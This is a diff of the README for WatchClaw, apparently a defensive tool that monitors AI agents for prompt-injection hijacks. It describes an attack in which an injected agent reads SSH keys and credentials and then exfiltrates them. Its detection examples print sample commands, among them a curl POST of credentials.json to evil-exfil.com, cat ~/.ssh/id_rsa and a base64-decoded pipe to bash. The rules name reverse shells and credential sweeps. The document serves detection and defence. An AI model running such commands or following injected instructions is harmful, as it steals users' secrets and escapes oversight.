@@ -1,222 +1,258 @@
 # WatchClaw
 
-> **Runtime security monitor for AI Agents** — Zeek for the AI Agent era.
+> **Zeek for the AI Agent era** — behavioral monitoring for OpenClaw agents.
 
-AI Agents can read files, execute commands, and make network requests autonomously. When an agent is hijacked via prompt injection, it looks like normal operation — Suricata and EDR can't see the difference. WatchClaw monitors agent behavior at the semantic level: it learns baselines, tracks data sensitivity, and detects attack patterns like read-then-exfiltrate chains that network-layer tools miss entirely.
+WatchClaw watches what your AI agents actually do: every file read, every shell command, every external request. When behavior deviates from baseline or matches known attack patterns, it alerts you in real time — without touching the agent's execution flow.
 
-## The Problem
+---
 
-AI agents like OpenClaw have full system access: file I/O, shell commands, HTTP requests. A prompt injection attack can silently redirect this power.
+## Why This Exists
 
-**Real attack scenario** (CVE-2026-25253, CVSS 8.8): A malicious webpage injects instructions into an agent's context. The agent reads `~/.ssh/id_rsa` and `~/.env`, then `curl`s the contents to an attacker-controlled domain. The entire chain looks like normal tool usage — no malware binary, no exploit payload, no anomalous network signature.
+AI agents running on [OpenClaw](https://github.com/openclaw/openclaw) have no external observer. A compromised agent — one that has been hijacked via prompt injection — can quietly read your credentials, exfiltrate data, or overwrite its own identity files. Nothing in OpenClaw's default setup would tell you this happened.
 
-Traditional security tools fail here:
+WatchClaw is that observer.
 
-- **Suricata/Zeek** see a normal HTTPS POST — nothing to flag
-- **EDR** sees a legitimate process reading a file — nothing unusual
-- **SecureClaw** runs inside the agent's own LLM — a hijacked agent ignores its own constraints
-
-The attack is invisible at every layer except one: **the semantic sequence of agent actions**.
-
-## How WatchClaw Works
-
-```
-                 ┌─────────────────────────────┐
-                 │     Event Ingestion          │
-                 │  OpenClaw logs / filesystem  │
-                 └─────────────┬───────────────┘
-                               │
-                 ┌─────────────▼───────────────┐
-                 │  Layer 1: Hard Rules (YAML)  │  ← microseconds
-                 │  15 deterministic rules      │
-                 └─────────────┬───────────────┘
-                               │
-                 ┌─────────────▼───────────────┐
-                 │  Layer 2: Behavior Engine    │  ← milliseconds
-                 │  6-signal anomaly scoring    │
-                 │  + taint tracking + sequences│
-                 └─────────────┬───────────────┘
-                               │ score ≥ 0.7
-                 ┌─────────────▼───────────────┐
-                 │  Layer 3: LLM Auditor        │  ← seconds
-                 │  Semantic intent analysis    │
-                 └─────────────┬───────────────┘
-                               │
-                 ┌─────────────▼───────────────┐
-                 │  Output: action.log │ alerts │
-                 │  Discord │ dashboard         │
-                 └─────────────────────────────┘
-```
-
-**Layer 1** catches known-bad patterns instantly — obfuscated commands, credential file sweeps, reverse shells. **Layer 2** scores every action against learned per-agent behavioral baselines using 6 weighted signals, taint tracking with exponential decay, and sequence pattern detection. **Layer 3** sends only high-score events (~1% of traffic) to an independent LLM for semantic judgment.
-
-## Demo
-
-<p align="center">
-  <img src="docs/demo.svg" alt="WatchClaw simulate — detecting data exfiltration and cognitive injection">
-</p>
-
-Normal agents (melody, teddy, judy, elodie) perform routine operations — git, pytest, file writes. The **rogue_agent** reads `credentials.json` and `id_ed25519`, tainting those reads. When it later requests `evil-exfil.com/upload`, WatchClaw detects the **read-then-exfiltrate sequence** and marks it as CRITICAL. It also catches the agent writing to `SOUL.md` after fetching external instructions — a **cognitive injection** attack.
-
-```bash
-pip install -e .
-watchclaw simulate --duration 25 --attack-ratio 0.2
-```
-
-## Quick Start
-
-```bash
-# Install
-pip install -e .
-
-# Monitor real OpenClaw agents
-watchclaw start
-
-# Run attack simulation for testing
-watchclaw simulate --duration 60 --attack-ratio 0.1
-
-# Open web dashboard
-watchclaw dashboard --port 8080
-
-# Print security report
-watchclaw report --last 24h
-```
-
-## Key Features
-
-### Behavioral Baselines
-WatchClaw learns each agent's normal patterns — when they're active, which files they touch, which domains they request, how fast they work. A dev agent reading source files at 2pm is normal. The same agent reading `.env` at 3am after 4 hours of user silence scores very differently.
-
-### 6-Signal Anomaly Scoring
-Every action is scored against 6 independent signals: time anomaly, user idle time, rate bursts, resource sensitivity, destination novelty, and taint flow. Weights adapt per-agent through user feedback — mark a false positive and the contributing signals are automatically dampened.
-
-### Taint Tracking with Decay
-When an agent reads `.env`, that data is "tainted." The taint decays exponentially (5-minute half-life) — a `curl` 30 seconds later is highly suspicious, but the same `curl` 20 minutes later barely registers. If the user explicitly says "send my config to X," the taint is sanitized. The action is still logged for audit, but no alert fires.
-
-### Sequence Pattern Detection
-Single actions are ambiguous. Sequences tell the story. WatchClaw detects multi-step attack chains:
-- **read_then_exfil**: Read `.env` → `curl` to unknown domain (within 120s)
-- **config_then_escalate**: Write config → run privileged command (within 60s)
-- **external_trigger_chain**: Fetch external URL → write to `SOUL.md` (within 30s)
-
-### 15 Hard Rules (YAML)
-Zero-tolerance rules for known-bad patterns: reverse shells, obfuscated execution (`base64 -d | sh`), bulk credential sweeps, cognitive file tampering, SSH key access. Rules are extensible via `configs/default-rules.yaml`.
-
-### Independent Observer
-WatchClaw runs as a separate process. The monitored agent's LLM cannot influence WatchClaw's judgment — even a fully hijacked agent cannot disable or bypass monitoring. This is the fundamental advantage over in-agent approaches like SecureClaw.
-
-## vs Existing Tools
-
-| Capability | WatchClaw | SecureClaw | agentsh | Suricata/Zeek | EDR |
-|---|---|---|---|---|---|
-| Independent of agent process | **Yes** | No (runs inside agent) | Yes | Yes | Yes |
-| Behavioral baseline learning | **Yes** | No | No | No | No |
-| Sequence pattern detection | **Yes** | No | No | Partial | No |
-| Taint tracking with decay | **Yes** | No | No | No | No |
-| Adaptive per-agent weights | **Yes** | No | No | No | No |
-| Semantic-level visibility | **Yes** | Partial | No | No | No |
-| Resistant to prompt injection | **Yes** | No (can be jailbroken) | Yes | N/A | N/A |
-| LLM-powered audit layer | **Yes** | No | No | No | No |
-
-**agentsh** tells you "the agent ran `curl`." WatchClaw tells you "the agent read `.env` at 3am, then `curl`ed a domain registered yesterday, while the user has been idle for 4 hours — this is likely data exfiltration."
-
-## Configuration
-
-Default config: `configs/default-config.yaml`
-
-```yaml
-log_dir: /tmp/openclaw              # OpenClaw log directory
-action_log: /tmp/watchclaw/action.log
-watch_dirs:
-  - ~/.openclaw/workspace-*         # Directories to monitor
-poll_interval: 2.0                  # Seconds between log checks
-taint_half_life: 300.0              # 5-minute decay (per-agent tunable)
-discord_webhook_url: null           # Set for real-time alerts
-
-thresholds:
-  normal: 0.3                        # < 0.3 = normal
-  log: 0.5                          # 0.3-0.5 = logged, no alert
-  alert: 0.7                        # 0.5-0.7 = alert sent
-                                    # ≥ 0.7 = critical, triggers LLM auditor
-auditor:
-  enabled: false
-  api_key: null
-```
-
-Security rules: `configs/default-rules.yaml` (15 rules, fully customizable)
+---
 
 ## Architecture
 
 ```
-┌──────────────────────────────────────────────────────────────────┐
-│                        Event Sources                             │
-│  OpenClaw Logs  │  File System Watcher  │  Simulated Events      │
-└────────────────────────────┬─────────────────────────────────────┘
-                             │
-                ┌────────────▼────────────┐
-                │   WatchClaw Engine      │
-                │   (Orchestration Hub)   │
-                └────────────┬────────────┘
-                             │
-         ┌───────────────────┼───────────────────┐
-         │                   │                   │
-  ┌──────▼──────┐    ┌──────▼──────┐    ┌───────▼──────┐
-  │  Layer 1    │    │  Taint      │    │  Sequence    │
-  │  Hard Rules │    │  Tracker    │    │  Detector    │
-  │  (YAML)     │    │  (Decay)    │    │  (Patterns)  │
-  └──────┬──────┘    └──────┬──────┘    └───────┬──────┘
-         └───────────────────┼───────────────────┘
-                             │
-                ┌────────────▼────────────┐
-                │  Layer 2: Anomaly       │
-                │  Scorer (6 Signals)     │
-                │  Adaptive Weights       │
-                └────────────┬────────────┘
-                             │
-                ┌────────────▼────────────┐
-                │  Layer 3: LLM Auditor   │
-                │  (if score ≥ 0.7)       │
-                └────────────┬────────────┘
-                             │
-              ┌──────────────┼──────────────┐
-              │                             │
-     ┌────────▼────────┐          ┌────────▼────────┐
-     │ Discord Alerts  │          │  Action Log     │
-     │ (Webhook)       │          │  (JSONL Audit)  │
-     └─────────────────┘          └─────────────────┘
+OpenClaw JSONL Logs
+        │
+        ▼
+┌──────────────┐
+│    Parser    │  Parses tool call events from raw logs.
+│              │  Extracts file paths and URLs from exec commands
+│              │  (cat, head, curl, wget, nc, etc.)
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│    Engine    │
+│              │
+│  ┌─────────┐ │  Tracks sensitivity across events with exponential
+│  │  Taint  │ │  decay (half-life 300s). Sensitive file read →
+│  │ Tracker │ │  taint propagates to subsequent outgoing requests.
+│  └─────────┘ │
+│              │
+│  ┌─────────┐ │  Detects multi-step attack chains within time windows:
+│  │Sequence │ │  read_then_exfil, config_then_escalate,
+│  │Detector │ │  external_trigger_chain (cognitive injection)
+│  └─────────┘ │
+│              │
+│  ┌─────────┐ │  Scores each event across 6 signals.
+│  │ Scorer  │ │  Learns per-agent behavioral baselines.
+│  └─────────┘ │  Decision: NORMAL / NOTICE / ALERT / CRITICAL
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│   Alerter    │  Discord webhook, action log, daily report
+└──────────────┘
 ```
 
-See [docs/architecture.md](docs/architecture.md) for detailed layer specifications.
+### Anomaly Signals
 
-## CLI Reference
+| Signal | Description |
+|--------|-------------|
+| `time_anomaly` | Activity during unusual hours vs. per-agent learned baseline |
+| `user_idle` | Action taken while user appears inactive |
+| `resource_anomaly` | Access to sensitive files or known-bad domains (score 0–1) |
+| `destination_anomaly` | Known-bad or newly-registered external domains |
+| `taint_flow` | Sensitive data read → outgoing request within time window |
+| `rate_burst` | Abnormally high action volume in short period |
+
+### Attack Sequence Patterns
+
+| Pattern ID | Trigger Condition |
+|------------|-------------------|
+| `read_then_exfil` | Sensitive file read → external web/exec request within 120s |
+| `config_then_escalate` | Identity/config file write → privileged exec within 60s |
+| `external_trigger_chain` | External fetch → SOUL.md / MEMORY.md write (cognitive injection) |
+
+### Hard Rules
+
+| Rule | Description |
+|------|-------------|
+| `WC-HARD-003` | Obfuscated command execution (`base64 -d \| bash`, encoded payloads) |
+| `WC-HARD-004` | Bulk credential harvesting (`find / -name "*.pem"` patterns) |
+
+---
+
+## Detection Capabilities
+
+WatchClaw detects exec-layer attacks with full semantic analysis. The v0.1.1 parser upgrade extracts file paths and URLs directly from shell commands, enabling taint tracking even when agents use exec instead of native tools.
+
+**Verified detections:**
 
 ```
-watchclaw start [--config FILE] [--simulate]   Start monitoring
-watchclaw simulate [--duration N] [--attack-ratio N] [--realistic]
-watchclaw dashboard [--port N]                 Launch web dashboard
-watchclaw report [--last 24h|1d|30m]           Print security report
-watchclaw logs [--tail N] [--agent ID] [--level ALERT]
-watchclaw profile [AGENT_ID]                   Show agent profiles
-watchclaw rules [--test EVENT.json]            List or test rules
-watchclaw status                               Show engine status
-watchclaw version                              Show version
+cat ~/.ssh/id_rsa
+  → file_read, sensitivity=0.95, resource_anomaly=1.0 → ALERT
+
+curl -X POST https://evil-exfil.com/upload -d @credentials.json
+  → web_fetch, destination_anomaly=1.0 + taint_flow=0.88 → ALERT
+
+echo 'Y3VybC4uLg==' | base64 -d | bash
+  → WC-HARD-003 obfuscated command → ALERT
+
+[Read credentials.json] → [curl evil.com within 120s]
+  → read_then_exfil sequence, score boost +0.4 → CRITICAL
+
+[curl pastebin.com] → [Write to SOUL.md]
+  → external_trigger_chain (cognitive injection) → CRITICAL
 ```
 
-## Documentation
+---
 
-- [Design Document](docs/design.md) — Problem statement, architecture rationale, and technical design
-- [Architecture](docs/architecture.md) — Three-layer detection engine deep dive
-- [Anomaly Signals](docs/signals.md) — The 6 signals and how scoring works
-- [Writing Rules](docs/rules.md) — Custom rule authoring guide
+## Known Limitations
 
-## License
+### OpenClaw Does Not Log Tool Arguments
 
-MIT — see [LICENSE](LICENSE).
+This is the primary constraint of the current v0.1 implementation.
+
+OpenClaw's JSONL log format records that a tool was called, but not its arguments:
+
+```
+# What OpenClaw logs:
+"embedded run tool start: runId=xxx tool=Read"
+
+# What WatchClaw needs for full detection:
+"tool=Read path=/Users/andy/.ssh/id_rsa"
+```
+
+**Consequence:** When agents use native `Read` or `web_fetch` tools, WatchClaw sees the event type but not the file path or URL. Semantic analysis is blind for native tool usage. The v0.1.1 exec path extraction is a partial workaround — it gives full visibility for shell-command-level access.
+
+### Alert-Only
+
+WatchClaw observes and alerts. It does not intercept or block. By the time a CRITICAL alert fires, the exec command has already run. This is an intentional design choice — false-positive blocking in an AI agent monitoring tool causes more harm than it prevents.
+
+### Behavioral Baseline Learning Curve
+
+Anomaly scoring depends on a per-agent baseline. New agents start with cold-start priors; baselines improve with a few days of normal operation.
+
+---
+
+## Defense-in-Depth Positioning
+
+Per the [OWASP Gen AI Security Project](https://owasp.org/www-project-top-10-for-large-language-model-applications/), no single technique prevents prompt injection. Effective defense requires multiple layers.
+
+WatchClaw occupies **Layer 3 — Output Behavior Monitoring:**
+
+```
+Layer 1 │ Architecture & Permissions
+        │ Least privilege, sandboxing, HITL for dangerous ops
+        │ → Configure in OpenClaw, not WatchClaw's domain
+        │
+Layer 2 │ Prompt Engineering
+        │ Input delimiters (Spotlighting), post-prompting
+        │ → OpenClaw wraps external content in EXTERNAL_UNTRUSTED_CONTENT
+        │
+Layer 3 │ Behavioral Monitoring  ◄── WatchClaw
+        │ Exec-layer taint tracking, sequence detection, anomaly scoring
+        │ Provides signals for Human-in-the-Loop review
+```
+
+WatchClaw's taint tracking is a **behavioral approximation of Origin Tracing**: instead of tracing which prompt instruction caused a tool call (which requires LLM context access), it traces data flow — did a sensitive resource read precede an outgoing request?
+
+---
+
+## Roadmap
+
+### v0.2 — OpenClaw Plugin (Route B)
+
+The correct long-term architecture is a native OpenClaw plugin using the `before_tool_call` hook (verified in `plugin-sdk/plugins/types.d.ts`):
+
+```typescript
+api.registerHook("before_tool_call", async (event, ctx) => {
+    // Full parameter visibility — no log parsing needed:
+    // Read      → event.params.path
+    // web_fetch → event.params.url
+    // exec      → event.params.command
+    // Write     → event.params.path + event.params.content
+
+    await watchclaw.analyze(event.toolName, event.params, ctx.agentId);
+
+    return undefined;  // Pure monitoring — never blocks
+});
+```
+
+This eliminates the log-argument blindspot entirely. The Python detection engine (taint, sequences, scoring) can be called as a local sidecar. The plugin ships as `npm install @watchclaw/openclaw-plugin` and registers via `openclaw plugins install`.
+
+**Security note on v0.2:** A `before_tool_call` plugin runs in-process and sees all tool parameters across all agents. Treat it as trusted code. The plugin must not persist raw file contents or response bodies — metadata only.
+
+### Further Directions
+
+- Upstream contribution to OpenClaw: log sanitized tool arguments (file path yes, file contents no; URL domain yes, query params with tokens no)
+- Per-agent policy profiles (developer agents tolerate wider exec patterns)
+- True Origin Tracing via LLM prompt context access
+- Evaluation benchmark for AI agent behavioral monitoring tools
+
+---
+
+## Installation
+
+Requires **Python 3.11+**. macOS ships with Python 3.9 — install a newer version first if needed.
+
+```bash
+# Recommended: Homebrew Python (macOS)
+brew install python@3.13
+pip3.13 install watchclaw
+
+# Or with any Python 3.11+ installation:
+python3 -m pip install watchclaw
+
+# Verify:
+watchclaw report
+```
+
+OpenClaw logs expected at `/tmp/openclaw/`.
+
+```bash
+# Start monitoring (reads OpenClaw logs continuously)
+watchclaw start
+
+# 24-hour summary: total events, alerts, top agents, rules triggered
+watchclaw report
+
+# View specific alerts — the most useful command
+watchclaw logs --level ALERT          # all alerts
+watchclaw logs --level CRITICAL       # critical only
+watchclaw logs --level ALERT --agent melody   # filter by agent
+watchclaw logs --tail 50              # last 50 events (any level)
+
+# Per-agent behavioral baseline (what's "normal" for each agent)
+watchclaw profile
+
+# Test detection with synthetic attack scenarios
+watchclaw simulate
+
+# List all active detection rules
+watchclaw rules
+```
+
+---
+
+## Project Structure
+
+```
+src/watchclaw/
+├── parser.py        # OpenClaw JSONL log parser + exec command semantic extraction
+├── taint.py         # Sensitivity propagation with exponential decay (half-life 300s)
+├── scorer.py        # 6-signal anomaly scoring + per-agent baseline learning
+├── sequence.py      # Multi-step attack pattern detection (sliding window)
+├── engine.py        # Orchestration
+├── rules.py         # Hard rules (WC-HARD-003 obfuscation, WC-HARD-004 harvesting)
+├── alerter.py       # Discord webhook + structured action log
+└── cli.py           # CLI entry points
+tests/               # 307 tests
+```
+
+---
 
 ## Contributing
 
-Issues and pull requests are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
+Issues and PRs welcome. The most impactful contribution is the v0.2 OpenClaw plugin — the detection engine is ready to be called from a TypeScript hook handler.
 
-## Acknowledgments
+## License
 
-Built for the [OpenClaw](https://github.com/openclaw/openclaw) ecosystem. Inspired by [Zeek](https://zeek.org)'s philosophy of comprehensive network monitoring applied to the AI agent layer.
+MIT
